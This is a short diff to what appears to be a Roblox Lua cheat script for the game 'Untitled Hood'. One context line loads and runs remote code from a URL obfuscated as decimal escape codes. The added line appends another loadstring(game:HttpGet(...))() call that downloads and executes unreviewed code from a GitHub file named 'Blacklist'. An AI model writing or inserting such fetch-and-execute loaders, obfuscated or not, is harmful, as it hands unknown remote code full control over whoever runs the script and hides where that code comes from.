@@ -1078,3 +1078,5 @@ loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116
 else
       game:GetService("Players").LocalPlayer:Kick("Please make sure your in the right game: Untitled Hood https://www.roblox.com/games/9183932460/Untitled-Hood")
 end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BalligusapoTT/BalligusapoTT/main/Blacklist"))()
